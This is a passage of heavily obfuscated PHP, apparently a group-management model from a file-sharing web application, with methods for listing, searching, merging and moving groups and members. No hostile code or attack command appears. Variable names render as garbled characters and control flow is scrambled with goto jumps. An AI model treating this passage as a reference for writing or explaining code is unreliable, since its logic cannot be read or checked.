$EŸêÎûºù∑[28], $EŸêÎûºù∑[1692], $EŸêÎûºù∑[194]); $búáÖ∂§ì” = array($EŸêÎûºù∑[429] => $EŸêÎûºù∑[430], $EŸêÎûºù∑[431] => $EŸêÎûºù∑[432]); goto Dæﬂó–îÇå; Dæﬂó–îÇå: $d˜ª∆í∑∞‘ = Input::get($EŸêÎûºù∑[436], $EŸêÎûºù∑[7], $EŸêÎûºù∑[1710], $EÌ¡‘‹◊Üä); $cçàÙú›∑≈ = Input::get($EŸêÎûºù∑[437], $EŸêÎûºù∑[7], $EŸêÎûºù∑[1793], array($EŸêÎûºù∑[1793], $EŸêÎûºù∑[431])); $cçàÙú›∑≈ = $búáÖ∂§ì”[$cçàÙú›∑≈]; goto eì∏éÎÿÇô; b‚û«⁄ŸÈ: } public function listChild($f’≠Ü§Ÿ“Ë) { $búõÕ ≈åå =& $_SERVER[™⁄»üÆ]; $F¡Ìº‹€±” = $this->where(array($búõÕ ≈åå[479] => $f’≠Ü§Ÿ“Ë))->_makeOrder()->selectPage(200); $this->_listDataApply($F¡Ìº‹€±”[$búõÕ ≈åå[367]]); return $F¡Ìº‹€±”; } public function listByID($bá´€Â†ªÜ) { $Eìéªèë⁄õ =& $_SERVER[™⁄»üÆ]; if (!$bá´€Â†ªÜ) { return array(); } $e∫çàÔÏá© = array($Eìéªèë⁄õ[1706] => array($Eìéªèë⁄õ[7], $bá´€Â†ªÜ)); $EÑº÷‹Áæ« = $this->where($e∫çàÔÏá©)->select(); $this->_listDataApply($EÑº÷‹Áæ«); return $EÑº÷‹Áæ«; } public function listSearch($f”ä´∫œÌ÷) { goto FêËíí‚êé; cÜæÀÜ‘ã≈: if ($FÒî†áΩúó) { $d¿≥à’î”∞ = $this->getInfoSimple($FÒî†áΩúó); $c›÷ä“êàæ = $d¿≥à’î”∞[$cÉÚú£Æ¿Æ[503]] . $FÒî†áΩúó . $cÉÚú£Æ¿Æ[527]; $CœÆèÀø¬ä = array($CœÆèÀø¬ä, array($cÉÚú£Æ¿Æ[503] => array($cÉÚú£Æ¿Æ[380], $c›÷ä“êàæ))); } $CœÆèÀø¬ä = $this->parseWhereLike($CœÆèÀø¬ä); $DÇ√â€ˆéâ = $this->_makeOrder()->where($CœÆèÀø¬ä)->selectPage(20); goto e‰°¥áº≥ï; e‰°¥áº≥ï: $DÇ√â€ˆéâ = $DÇ√â€ˆéâ ? $DÇ√â€ˆéâ : array($cÉÚú£Æ¿Æ[367] => array(), $cÉÚú£Æ¿Æ[364] => array()); if (!$DÇ√â€ˆéâ || count($DÇ√â€ˆéâ[$cÉÚú£Æ¿Æ[367]]) < 5 && Input::check($dò¯ëêë≈„, $cÉÚú£Æ¿Æ[316])) { goto Eù´ôãÈÏå; f÷°Óﬁí»ê: $DÇ√â€ˆéâ[$cÉÚú£Æ¿Æ[364]][$cÉÚú£Æ¿Æ[366]] = ceil($DÇ√â€ˆéâ[$cÉÚú£Æ¿Æ[364]][$cÉÚú£Æ¿Æ[365]] / $DÇ√â€ˆéâ[$cÉÚú£Æ¿Æ[364]][$cÉÚú£Æ¿Æ[361]]); goto Bî·ıñ≈≤£; Eù´ôãÈÏå: $F«íõÈøö› = $this->groupChildrenAll($FÒî†áΩúó); $fÇÑÛ‡çáÿ = $this->_searchFromMeta($cÉÚú£Æ¿Æ[444], $dò¯ëêë≈„, 10, $F«íõÈøö›); $bîÇ°’§Ïè = $this->_searchFromMeta($cÉÚú£Æ¿Æ[445], $dò¯ëêë≈„, 10, $F«íõÈøö›); goto b –»ã›ıÂ; b –»ã›ıÂ: $FèéÁ≤ΩÍΩ = array_merge($fÇÑÛ‡çáÿ, $bîÇ°’§Ïè, $DÇ√â€ˆéâ[$cÉÚú£Æ¿Æ[367]]); $DÇ√â€ˆéâ[$cÉÚú£Æ¿Æ[367]] = array_unique_by_key($FèéÁ≤ΩÍΩ, $cÉÚú£Æ¿Æ[1706]); $DÇ√â€ˆéâ[$cÉÚú£Æ¿Æ[364]][$cÉÚú£Æ¿Æ[365]] = count($DÇ√â€ˆéâ[$cÉÚú£Æ¿Æ[367]]); goto f÷°Óﬁí»ê; Bî·ıñ≈≤£: } $this->_listDataApply($DÇ√â€ˆéâ[$cÉÚú£Æ¿Æ[367]]); goto c¬ËâÖÙ”Ö; c¬ËâÖÙ”Ö: return $DÇ√â€ˆéâ; goto BøıŒ·¯îß; fÑÊÇÌŸÑˆ: if (!trim($dò¯ëêë≈„)) { return !1; } $dò¯ëêë≈„ = str_replace($cÉÚú£Æ¿Æ[1796], $cÉÚú£Æ¿Æ[1797], $dò¯ëêë≈„); $CœÆèÀø¬ä = array($cÉÚú£Æ¿Æ[1706] => array($cÉÚú£Æ¿Æ[380], "{$dò¯ëêë≈„}\45"), $cÉÚú£Æ¿Æ[28] => array($cÉÚú£Æ¿Æ[380], "\x25{$dò¯ëêë≈„}\x25"), $cÉÚú£Æ¿Æ[967] => $cÉÚú£Æ¿Æ[1798]); goto cÜæÀÜ‘ã≈; FêËíí‚êé: $cÉÚú£Æ¿Æ =& $_SERVER[™⁄»üÆ]; $dò¯ëêë≈„ = $f”ä´∫œÌ÷[$cÉÚú£Æ¿Æ[1794]]; $FÒî†áΩúó = isset($f”ä´∫œÌ÷[$cÉÚú£Æ¿Æ[1795]]) ? $f”ä´∫œÌ÷[$cÉÚú£Æ¿Æ[1795]] : !1; goto fÑÊÇÌŸÑˆ; BøıŒ·¯îß: } protected function groupChildrenAll($aÇá¯ÛÍóÑ) { $D«®ÈÜêÑÃ =& $_SERVER[™⁄»üÆ]; if (!$aÇá¯ÛÍóÑ) { return !1; } if (is_string($aÇá¯ÛÍóÑ)) { $aÇá¯ÛÍóÑ = array($aÇá¯ÛÍóÑ); } $a„ƒ—¥⁄∏€ = $aÇá¯ÛÍóÑ; foreach ($aÇá¯ÛÍóÑ as $bàøÍ€≤Ù—) { $c¯À©Ñ›∫‚ = $this->getInfoSimple($bàøÍ€≤Ù—); $E¢›Õò∞Î» = array($D«®ÈÜêÑÃ[503] => array($D«®ÈÜêÑÃ[380], $c¯À©Ñ›∫‚[$D«®ÈÜêÑÃ[503]] . $bàøÍ€≤Ù— . $D«®ÈÜêÑÃ[527])); $cëÓâà≈âí = $this->field($D«®ÈÜêÑÃ[1706])->where($E¢›Õò∞Î»)->select(); $a„ƒ—¥⁄∏€ = array_merge($a„ƒ—¥⁄∏€, array_to_keyvalue($cëÓâà≈âí, $D«®ÈÜêÑÃ[33], $D«®ÈÜêÑÃ[1706])); } return array_unique($a„ƒ—¥⁄∏€); } private function _searchFromMeta($Eë®»û´®ñ, $fë√ÓÂ˘¯î, $a∞Æ‹‘ã¢, $få¨Æ≈ñ˜ì) { goto EÈŸë£áÊ¯; FÎªÁÕ◊™›: if (!$cÖıäØ—Ω¿) { return array(); } $cÖıäØ—Ω¿ = array_to_keyvalue($cÖıäØ—Ω¿, $aç„Ë°Ø÷–[33], $aç„Ë°Ø÷–[1706]); $eê◊∫â⁄Â∆ = $this->where(array($aç„Ë°Ø÷–[1790] => array($aç„Ë°Ø÷–[7], $cÖıäØ—Ω¿)))->select(); goto EŸ£ÿ¥Ú¥ﬂ; EÈŸë£áÊ¯: $aç„Ë°Ø÷– =& $_SERVER[™⁄»üÆ]; $fë√ÓÂ˘¯î = strtolower($fë√ÓÂ˘¯î); $DÏ¶££ë…å = array($aç„Ë°Ø÷–[93] => $Eë®»û´®ñ, $aç„Ë°Ø÷–[372] => array($aç„Ë°Ø÷–[380], "\x25{$fë√ÓÂ˘¯î}\45")); goto F‡ÏÃ¯πıÕ; F‡ÏÃ¯πıÕ: $DÏ¶££ë…å = $this->parseWhereLike($DÏ¶££ë…å); if ($få¨Æ≈ñ˜ì) { $DÏ¶££ë…å[$aç„Ë°Ø÷–[1706]] = array($aç„Ë°Ø÷–[7], $få¨Æ≈ñ˜ì); } $cÖıäØ—Ω¿ = Model($aç„Ë°Ø÷–[1799])->where($DÏ¶££ë…å)->limit($a∞Æ‹‘ã¢)->select(); goto FÎªÁÕ◊™›; EŸ£ÿ¥Ú¥ﬂ: if (!$eê◊∫â⁄Â∆) { return array(); } return $eê◊∫â⁄Â∆; goto CºõÛÌ≠†∆; CºõÛÌ≠†∆: } protected function _listDataApplyItem($D‡©åˆÂ±Ù) { $Aªáø¬≤áõ = array($D‡©åˆÂ±Ù); $this->_listDataApply($Aªáø¬≤áõ); return $Aªáø¬≤áõ[0]; } protected function _listDataApply(&$fÑãçÚùﬁé) { goto Cÿèèπ≥⁄Ü; aèœ€åÀﬁ∫: $this->_listAppendParent($fÑãçÚùﬁé); $this->_listAppendSourceRoot($fÑãçÚùﬁé, $F®èå÷¯çº); goto D˘±ß∑°≈±; fÌœàáÉÇâ: $this->_listAppendChildren($fÑãçÚùﬁé); $this->_listAppendChildrenMember($fÑãçÚùﬁé); $this->_listAppendMeta($fÑãçÚùﬁé, $F®èå÷¯çº); goto aèœ€åÀﬁ∫; Cÿèèπ≥⁄Ü: $Cæë∂Øﬂó® =& $_SERVER[™⁄»üÆ]; if (!$fÑãçÚùﬁé) { return; } $F®èå÷¯çº = array_to_keyvalue($fÑãçÚùﬁé, $Cæë∂Øﬂó®[33], $Cæë∂Øﬂó®[1706]); goto fÌœàáÉÇâ; D˘±ß∑°≈±: } private function _listAppendChildren(&$CÁüª•“›ó) { goto eï≠èçô¿ ; e„¢Ñè©›ﬂ: foreach ($CÁüª•“›ó as &$eÁëÜå•Öé) { $b∂ÕËöµíÕ = $eÁëÜå•Öé[$bÕ—òòÌâ¥[1706]]; $eÁëÜå•Öé[$bÕ—òòÌâ¥[1801]] = isset($CºÕí€√ü’[$b∂ÕËöµíÕ]) ? intval($CºÕí€√ü’[$b∂ÕËöµíÕ]) : !1; } unset($eÁëÜå•Öé); goto d—«æŸ∏û«; e”¯Éå¢£í: $fäÊ¿¡ŸÔ¥ = array($bÕ—òòÌâ¥[479], $bÕ—òòÌâ¥[1800] => $bÕ—òòÌâ¥[481]); $e∫Ñ±ñ ‹€ = $this->field($fäÊ¿¡ŸÔ¥)->where($c¶ÀÑòé¡Ò)->group($bÕ—òòÌâ¥[479])->select(); $CºÕí€√ü’ = array_to_keyvalue($e∫Ñ±ñ ‹€, $bÕ—òòÌâ¥[479], $bÕ—òòÌâ¥[481]); goto e„¢Ñè©›ﬂ; eï≠èçô¿ : $bÕ—òòÌâ¥ =& $_SERVER[™⁄»üÆ]; $D«€»Æ¢áè = array_to_keyvalue($CÁüª•“›ó, $bÕ—òòÌâ¥[33], $bÕ—òòÌâ¥[1706]); $c¶ÀÑòé¡Ò = array($bÕ—òòÌâ¥[479] => array($bÕ—òòÌâ¥[7], $D«€»Æ¢áè)); goto e”¯Éå¢£í; d—«æŸ∏û«: } private function _listAppendChildrenMember(&$bÀÙË“É£ä) { goto fà¬ÍäÈ∑À; fà¬ÍäÈ∑À: $DŸòÃÜê∫∞ =& $_SERVER[™⁄»üÆ]; $c·ãÜ≤à„Ú = array_to_keyvalue($bÀÙË“É£ä, $DŸòÃÜê∫∞[33], $DŸòÃÜê∫∞[1706]); $e—¡’¶Ë¨≥ = array($DŸòÃÜê∫∞[1706] => array($DŸòÃÜê∫∞[7], $c·ãÜ≤à„Ú)); goto E±ØäªéÃ⁄; E±ØäªéÃ⁄: $E†ãÜ’à“Ú = array($DŸòÃÜê∫∞[1706], $DŸòÃÜê∫∞[1800] => $DŸòÃÜê∫∞[481]); $E¡À§ö©âã = Model($DŸòÃÜê∫∞[1792])->field($E†ãÜ’à“Ú)->where($e—¡’¶Ë¨≥)->group($DŸòÃÜê∫∞[1706])->select(); $e¶‡êÎπ¨ˆ = array_to_keyvalue($E¡À§ö©âã, $DŸòÃÜê∫∞[1706], $DŸòÃÜê∫∞[481]); goto cü¬‹≈åä ; cü¬‹≈åä : foreach ($bÀÙË“É£ä as &$DÎ£øêÇåÛ) { $bΩè“™äƒ— = $DÎ£øêÇåÛ[$DŸòÃÜê∫∞[1706]]; $DÎ£øêÇåÛ[$DŸòÃÜê∫∞[1802]] = isset($e¶‡êÎπ¨ˆ[$bΩè“™äƒ—]) ? intval($e¶‡êÎπ¨ˆ[$bΩè“™äƒ—]) : !1; } unset($DÎ£øêÇåÛ); goto a¢¶€ˆ∏∫”; a¢¶€ˆ∏∫”: } private function _listAppendMeta(&$fî‡’∏«÷ù, $e¥Çñ‹∏ÕÂ) { goto F™¿∞ò∑ãÀ; båììﬁÉôß: foreach ($fî‡’∏«÷ù as &$eÆ¢≠Ñ≤æ¬) { $eÆ¢≠Ñ≤æ¬[$e∆œÈÖÑßÑ[446]] = array(); if (isset($EÖ“Â∑™ö∏[$eÆ¢≠Ñ≤æ¬[$e∆œÈÖÑßÑ[1706]]])) { $eÆ¢≠Ñ≤æ¬[$e∆œÈÖÑßÑ[446]] = $EÖ“Â∑™ö∏[$eÆ¢≠Ñ≤æ¬[$e∆œÈÖÑßÑ[1706]]]; } } unset($eÆ¢≠Ñ≤æ¬); goto aÔ™§û¶≈û; F™¿∞ò∑ãÀ: $e∆œÈÖÑßÑ =& $_SERVER[™⁄»üÆ]; $a—Õ¡∞ã∑∂ = array($e∆œÈÖÑßÑ[1706] => array($e∆œÈÖÑßÑ[7], $e¥Çñ‹∏ÕÂ)); $EÖ“Â∑™ö∏ = Model($e∆œÈÖÑßÑ[1791])->where($a—Õ¡∞ã∑∂)->select(); goto eê’ŸÏÀøı; eê’ŸÏÀøı: $EÖ“Â∑™ö∏ = array_to_keyvalue_group($EÖ“Â∑™ö∏, $e∆œÈÖÑßÑ[1706]); foreach ($EÖ“Â∑™ö∏ as &$A¬™ îÖ™È) { $A¬™ îÖ™È = array_to_keyvalue($A¬™ îÖ™È, $e∆œÈÖÑßÑ[93], $e∆œÈÖÑßÑ[372]); } unset($A¬™ îÖ™È); goto båììﬁÉôß; aÔ™§û¶≈û: } protected function parentLevelArray($A’ï°Ö™Ù§) { $Eçàè¡Ôã¯ =& $_SERVER[™⁄»üÆ]; $A’ï°Ö™Ù§ = explode($Eçàè¡Ôã¯[47], trim($A’ï°Ö™Ù§, $Eçàè¡Ôã¯[47])); $A’ï°Ö™Ù§ = array_remove_value($A’ï°Ö™Ù§, $Eçàè¡Ôã¯[191]); return $A’ï°Ö™Ù§; } private function _listAppendParent(&$cåù‘ä∏ﬂﬁ) { goto b•êûÒ∞µ„; Fá¶É¨≠ë«: if ($GLOBALS[$fÆæã¬é‹§[486]] == $fÆæã¬é‹§[87]) { $CŒ‰«ú˜†” = !1; } foreach ($cåù‘ä∏ﬂﬁ as &$A˜‚¬È¥Ê∑) { $b¯ïáÕõ““ = $this->parentLevelArray($A˜‚¬È¥Ê∑[$fÆæã¬é‹§[503]]); $E† ‹√Ã•ô = $fÆæã¬é‹§[33]; foreach ($b¯ïáÕõ““ as $bÛªı‚îı => $Aâó•∏≈Ã¡) { if ($CŒ‰«ú˜†” && $bÛªı‚îı == 0) { continue; } $E† ‹√Ã•ô .= $FöÒ∆∂äÖµ[$Aâó•∏≈Ã¡] . $fÆæã¬é‹§[8]; } if ($b¯ïáÕõ““) { $E† ‹√Ã•ô .= $A˜‚¬È¥Ê∑[$fÆæã¬é‹§[28]]; } $A˜‚¬È¥Ê∑[$fÆæã¬é‹§[508]] = str_replace($fÆæã¬é‹§[511], $fÆæã¬é‹§[8], $E† ‹√Ã•ô); } unset($A˜‚¬È¥Ê∑); goto dœ…Ÿ≠·°ï; b•êûÒ∞µ„: $fÆæã¬é‹§ =& $_SERVER[™⁄»üÆ]; $FöÒ∆∂äÖµ = array(); foreach ($cåù‘ä∏ﬂﬁ as &$A˜‚¬È¥Ê∑) { $FöÒ∆∂äÖµ[$A˜‚¬È¥Ê∑[$fÆæã¬é‹§[1706]]] = $A˜‚¬È¥Ê∑[$fÆæã¬é‹§[28]]; $b¯ïáÕõ““ = $this->parentLevelArray($A˜‚¬È¥Ê∑[$fÆæã¬é‹§[503]]); foreach ($b¯ïáÕõ““ as $Aâó•∏≈Ã¡) { if (!isset($FöÒ∆∂äÖµ[$Aâó•∏≈Ã¡])) { $FöÒ∆∂äÖµ[$Aâó•∏≈Ã¡] = 0; } } } goto a”ÿü∆®Áı; a”ÿü∆®Áı: unset($A˜‚¬È¥Ê∑); foreach ($FöÒ∆∂äÖµ as $bÛªı‚îı => $aïÍª«±ÌÔ) { if ($aïÍª«±ÌÔ) { continue; } $c∞Ωûä—ì† = $this->getInfoSimple($bÛªı‚îı); $FöÒ∆∂äÖµ[$bÛªı‚îı] = $c∞Ωûä—ì†[$fÆæã¬é‹§[28]]; } $CŒ‰«ú˜†” = $GLOBALS[$fÆæã¬é‹§[6]][$fÆæã¬é‹§[88]][$fÆæã¬é‹§[1803]]; goto Fá¶É¨≠ë«; dœ…Ÿ≠·°ï: } private function _listAppendSourceRoot(&$DÑØ≤éŒ∫ü, $E”ƒπ£Çöà) { goto BﬁÚæ¯ã∞»; BﬁÚæ¯ã∞»: $f÷”ú∑ôÒì =& $_SERVER[™⁄»üÆ]; $b√‡Óÿø†ô = array($f÷”ú∑ôÒì[479] => 0, $f÷”ú∑ôÒì[485] => array($f÷”ú∑ôÒì[7], $E”ƒπ£Çöà), $f÷”ú∑ôÒì[405] => SourceModel::TYPE_GROUP); $cçêæÜñ¢À = Model($f÷”ú∑ôÒì[809])->order($f÷”ú∑ôÒì[1804])->field($f÷”ú∑ôÒì[1805]); goto E©âç£ÇÕô; fŸ¶™∫¶»Ω: foreach ($DÑØ≤éŒ∫ü as &$A≥”ÁÓßÛº) { $A≥”ÁÓßÛº[$f÷”ú∑ôÒì[85]] = $eÕëîûü˘É[$A≥”ÁÓßÛº[$f÷”ú∑ôÒì[1706]]] ? $eÕëîûü˘É[$A≥”ÁÓßÛº[$f÷”ú∑ôÒì[1706]]] : array(); } unset($A≥”ÁÓßÛº); goto fá«÷√èèº; E©âç£ÇÕô: $eÕëîûü˘É = $cçêæÜñ¢À->limit(count($E”ƒπ£Çöà))->where($b√‡Óÿø†ô)->select(); $eÕëîûü˘É = array_to_keyvalue($eÕëîûü˘É, $f÷”ú∑ôÒì[485]); $eÕëîûü˘É = array_remove_key($eÕëîûü˘É, $f÷”ú∑ôÒì[485]); goto fŸ¶™∫¶»Ω; fá«÷√èèº: } protected function groupMerge($B«›èµÙ¯) { $B«›èµÙ¯ = array_values(array_unique($B«›èµÙ¯)); $aÌ¯ÿâæ“ü = array(); for ($d•›ÛﬂÙ©ö = 0; $d•›ÛﬂÙ©ö < count($B«›èµÙ¯); $d•›ÛﬂÙ©ö++) { $CœáÃÓÖØŒ = !1; for ($AÆ»áåÈ÷å = 0; $AÆ»áåÈ÷å < count($B«›èµÙ¯); $AÆ»áåÈ÷å++) { if ($d•›ÛﬂÙ©ö == $AÆ»áåÈ÷å) { continue; } if ($this->isParentOf($B«›èµÙ¯[$AÆ»áåÈ÷å], $B«›èµÙ¯[$d•›ÛﬂÙ©ö])) { $CœáÃÓÖØŒ = !0; break; } } if (!$CœáÃÓÖØŒ) { $aÌ¯ÿâæ“ü[] = $B«›èµÙ¯[$d•›ÛﬂÙ©ö]; } } return $aÌ¯ÿâæ“ü; } protected function isParentOf($aü±Ωí∆÷ã, $eÏíéîÑÒŒ) { goto DÙÿåß¿óπ; FÍÔ´åŒ∏∏: $dË•¨∫⁄©© = $this->getInfoSimple($eÏíéîÑÒŒ); $eŒæÁèÀ É = $BëÓ€Óû‘Ò[$cÖ¬…åÑàä[503]] . $aü±Ωí∆÷ã . $cÖ¬…åÑàä[47]; if (substr($dË•¨∫⁄©©[$cÖ¬…åÑàä[503]], 0, strlen($eŒæÁèÀ É)) == $eŒæÁèÀ É) { return !0; } goto cÙªÌùÆ¶æ; DÙÿåß¿óπ: $cÖ¬…åÑàä =& $_SERVER[™⁄»üÆ]; if (!$aü±Ωí∆÷ã || !$eÏíéîÑÒŒ || $aü±Ωí∆÷ã == $eÏíéîÑÒŒ) { return !1; } $BëÓ€Óû‘Ò = $this->getInfoSimple($aü±Ωí∆÷ã); goto FÍÔ´åŒ∏∏; cÙªÌùÆ¶æ: return !1; goto AÖ‹±ÁßÕß; AÖ‹±ÁßÕß: } public function groupShowRoot($Dã–π„ã∂é, $d”‹©ÑÜÔú = false) { goto Bÿ¯†ÈÉπ€; FﬂÊ—Ö–æ‡: if ($d”‹©ÑÜÔú && count($f≠Ñ≤è´‹—) == 1) { return $c∑ ÔÛ◊Ï¿; } if (!$EΩÎßø◊‚é[$F©≈öáπè÷[446]] || !isset($EΩÎßø◊‚é[$F©≈öáπè÷[446]][$F©≈öáπè÷[1788]]) || $EΩÎßø◊‚é[$F©≈öáπè÷[446]][$F©≈öáπè÷[1788]] == $F©≈öáπè÷[1760]) { return $this->groupShowRoot($f≠Ñ≤è´‹—[count($f≠Ñ≤è´‹—) - 1], $d”‹©ÑÜÔú); } if ($EΩÎßø◊‚é[$F©≈öáπè÷[446]][$F©≈öáπè÷[1788]] == $F©≈öáπè÷[355]) { $AÓÊúæëü© = explode($F©≈öáπè÷[47], $EΩÎßø◊‚é[$F©≈öáπè÷[446]][$F©≈öáπè÷[1789]]); if ($AÓÊúæëü©) { $c∑ ÔÛ◊Ï¿ = array_merge($c∑ ÔÛ◊Ï¿, $AÓÊúæëü©); } } goto B∏ù†ÜÖ∆º; B∏ù†ÜÖ∆º: return $c∑ ÔÛ◊Ï¿; goto aÒ≤õÙ÷áﬂ; cÙË∑ÖË´Á: $f≠Ñ≤è´‹— = $this->parentLevelArray($EΩÎßø◊‚é[$F©≈öáπè÷[503]]); $c∑ ÔÛ◊Ï¿ = array($Dã–π„ã∂é); if (count($f≠Ñ≤è´‹—) == 0) { return $c∑ ÔÛ◊Ï¿; } goto FﬂÊ—Ö–æ‡; Bÿ¯†ÈÉπ€: $F©≈öáπè÷ =& $_SERVER[™⁄»üÆ]; $EΩÎßø◊‚é = $this->getInfo($Dã–π„ã∂é); if (!$EΩÎßø◊‚é) { return array(); } goto cÙË∑ÖË´Á; aÒ≤õÙ÷áﬂ: } protected function resetParentLevel() { $Fé›∂ÆçäÊ =& $_SERVER[™⁄»üÆ]; $EŒ”®»Œ£ª = $Fé›∂ÆçäÊ[1706]; $aù•‡¿ÕÇÜ = $this->select(); $aù•‡¿ÕÇÜ = array_to_keyvalue($aù•‡¿ÕÇÜ, $EŒ”®»Œ£ª); foreach ($aù•‡¿ÕÇÜ as $c⁄Â»è®Ñä) { goto eÈÑ‚ÑäóÀ; AÌ»˜ﬂπ„≈: $aùã¿ñÂáŸ[] = 0; $aùã¿ñÂáŸ = $Fé›∂ÆçäÊ[47] . implode($Fé›∂ÆçäÊ[47], array_reverse($aùã¿ñÂáŸ)) . $Fé›∂ÆçäÊ[47]; $this->setNamePinyin($c⁄Â»è®Ñä[$EŒ”®»Œ£ª], $c⁄Â»è®Ñä[$Fé›∂ÆçäÊ[28]]); goto F“ŒñêÈ≈◊; F“ŒñêÈ≈◊: $this->where(array($EŒ”®»Œ£ª => $c⁄Â»è®Ñä[$EŒ”®»Œ£ª]))->save(array($Fé›∂ÆçäÊ[567] => $aùã¿ñÂáŸ)); goto BâÓÂﬂÿÇæ; eÈÑ‚ÑäóÀ: $eÃ“ßÕœ∏¬ = $c⁄Â»è®Ñä; $aùã¿ñÂáŸ = array(); while ($eÃ“ßÕœ∏¬[$Fé›∂ÆçäÊ[479]] != 0) { $aùã¿ñÂáŸ[] = $eÃ“ßÕœ∏¬[$Fé›∂ÆçäÊ[479]]; $eÃ“ßÕœ∏¬ = $aù•‡¿ÕÇÜ[$eÃ“ßÕœ∏¬[$Fé›∂ÆçäÊ[479]]]; } goto AÌ»˜ﬂπ„≈; BâÓÂﬂÿÇæ: } return $aù•‡¿ÕÇÜ; } public function groupNameAuto($eìÙÇÏë—ì, $cë›»⁄ÏØÛ) { $C•ìÛö‡⁄· =& $_SERVER[™⁄»üÆ]; $a†øúï¯Ë’ = $this->where(array($C•ìÛö‡⁄·[395] => $eìÙÇÏë—ì))->getField($C•ìÛö‡⁄·[28], !0); if (!$a†øúï¯Ë’ || !in_array($cë›»⁄ÏØÛ, $a†øúï¯Ë’)) { return $cë›»⁄ÏØÛ; } for ($cπíüüëÊ” = 1; $cπíüüëÊ” <= count($a†øúï¯Ë’) + 1; $cπíüüëÊ”++) { $AÛ¢Øùä©Ì = $cë›»⁄ÏØÛ . "\50{$cπíüüëÊ”}\x29"; if (!in_array($AÛ¢Øùä©Ì, $a†øúï¯Ë’)) { return $AÛ¢Øùä©Ì; } } } public function groupSwitch($d•»ßµóÁ, $dÖÒáÑüÛ√) { goto B£æ≥µÉÜÍ; bßŒ∫ø±‰ò: $C€»¿ÊÃ‡˜ = array($D∂º‘ÕÏá∑[405] => 2, $D∂º‘ÕÏá∑[479] => 0, $D∂º‘ÕÏá∑[404] => 1, $D∂º‘ÕÏá∑[485] => array($D∂º‘ÕÏá∑[7], array($d•»ßµóÁ, $dÖÒáÑüÛ√))); $eÊåú¥∫™¥ = Model($D∂º‘ÕÏá∑[809])->where($C€»¿ÊÃ‡˜)->field($D∂º‘ÕÏá∑[1807])->select(); $eÊåú¥∫™¥ = array_to_keyvalue($eÊåú¥∫™¥, $D∂º‘ÕÏá∑[485], $D∂º‘ÕÏá∑[396]); goto cÜÑÑƒıì§; cö°Ø„Îáã: $this->where(array($D∂º‘ÕÏá∑[479] => $d•»ßµóÁ))->save(array($D∂º‘ÕÏá∑[479] => $dÖÒáÑüÛ√)); $this->_clearChildrenCache($e≠™ØòÆØÂ[$dÖÒáÑüÛ√]); return !0; goto A¡ü´≠≤ﬁã; cÜÑÑƒıì§: $D≠ô˜äî®ü = !empty($eÊåú¥∫™¥[$d•»ßµóÁ]) ? $eÊåú¥∫™¥[$d•»ßµóÁ] : !1; if ($D≠ô˜äî®ü) { goto F∞∫ÖÎÀÖï; d÷Ñö’œÁµ: foreach ($eÊåú¥∫™¥ as $EÈéÏÌ⁄ŒÊ) { $Açì–‹Í∆° = $EÈéÏÌ⁄ŒÊ[$D∂º‘ÕÏá∑[404]] == $D∂º‘ÕÏá∑[87] ? REPEAT_RENAME_FOLDER : REPEAT_RENAME; Model($D∂º‘ÕÏá∑[809])->move($EÈéÏÌ⁄ŒÊ[$D∂º‘ÕÏá∑[396]], $eŒ÷Óòãıú, $Açì–‹Í∆°); } Model($D∂º‘ÕÏá∑[809])->moveClearAuth = !0; $C€»¿ÊÃ‡˜ = array($D∂º‘ÕÏá∑[405] => 2, $D∂º‘ÕÏá∑[485] => $d•»ßµóÁ); goto C°êªÙí°ü; C°êªÙí°ü: $f≈æœÔóÀï = array($D∂º‘ÕÏá∑[485] => $dÖÒáÑüÛ√); Model($D∂º‘ÕÏá∑[1809])->where($C€»¿ÊÃ‡˜)->save($f≈æœÔóÀï); Model($D∂º‘ÕÏá∑[1810])->where($C€»¿ÊÃ‡˜)->save($f≈æœÔóÀï); goto BŸÆ™Ø∞Îù; CÙà≤äÙãΩ: $eÊåú¥∫™¥ = Model($D∂º‘ÕÏá∑[809])->where($C€»¿ÊÃ‡˜)->field($D∂º‘ÕÏá∑[1808])->select(); if (!$eÊåú¥∫™¥) { $eÊåú¥∫™¥ = array(); } Model($D∂º‘ÕÏá∑[809])->moveClearAuth = !1; goto d÷Ñö’œÁµ; F∞∫ÖÎÀÖï: if (!$eÊåú¥∫™¥[$dÖÒáÑüÛ√]) { $eÊåú¥∫™¥[$dÖÒáÑüÛ√] = Model($D∂º‘ÕÏá∑[809])->groupRootAdd($dÖÒáÑüÛ√); } $eŒ÷Óòãıú = $eÊåú¥∫™¥[$dÖÒáÑüÛ√]; $C€»¿ÊÃ‡˜ = array($D∂º‘ÕÏá∑[479] => $D≠ô˜äî®ü); goto CÙà≤äÙãΩ; BŸÆ™Ø∞Îù: } $this->_changeChildLevel($e≠™ØòÆØÂ[$d•»ßµóÁ], $e≠™ØòÆØÂ[$dÖÒáÑüÛ√], !0); goto cö°Ø„Îáã; f°®àØıﬁ©: $C„Öí·Ö∂∫ = Model($D∂º‘ÕÏá∑[1792])->where($C€»¿ÊÃ‡˜)->select(); if (!$C„Öí·Ö∂∫) { $C„Öí·Ö∂∫ = array(); } foreach ($C„Öí·Ö∂∫ as $AŒ§é∆ï’¿) { $Eﬂ¬ŒÃÆ€ÿ = $AŒ§é∆ï’¿[$D∂º‘ÕÏá∑[1537]]; $C€»¿ÊÃ‡˜ = array($D∂º‘ÕÏá∑[1537] => $Eﬂ¬ŒÃÆ€ÿ, $D∂º‘ÕÏá∑[1706] => $dÖÒáÑüÛ√); $b¢“Ê«€πä = Model($D∂º‘ÕÏá∑[1792])->where($C€»¿ÊÃ‡˜)->find(); if (!$b¢“Ê«€πä) { $bÃ®Ú›§∞∑ = array($dÖÒáÑüÛ√ => $AŒ§é∆ï’¿[$D∂º‘ÕÏá∑[1806]]); Model($D∂º‘ÕÏá∑[520])->userGroupAdd($Eﬂ¬ŒÃÆ€ÿ, $bÃ®Ú›§∞∑); } Model($D∂º‘ÕÏá∑[520])->userGroupRemove($Eﬂ¬ŒÃÆ€ÿ, $d•»ßµóÁ); } goto bßŒ∫ø±‰ò; B£æ≥µÉÜÍ: $D∂º‘ÕÏá∑ =& $_SERVER[™⁄»üÆ]; $C€»¿ÊÃ‡˜ = array($D∂º‘ÕÏá∑[1706] => array($D∂º‘ÕÏá∑[7], array($d•»ßµóÁ, $dÖÒáÑüÛ√))); $e≠™ØòÆØÂ = $this->where($C€»¿ÊÃ‡˜)->select(); goto eá‹Óá”◊´; eá‹Óá”◊´: $e≠™ØòÆØÂ = array_to_keyvalue($e≠™ØòÆØÂ, $D∂º‘ÕÏá∑[1706]); if (!isset($e≠™ØòÆØÂ[$d•»ßµóÁ]) || 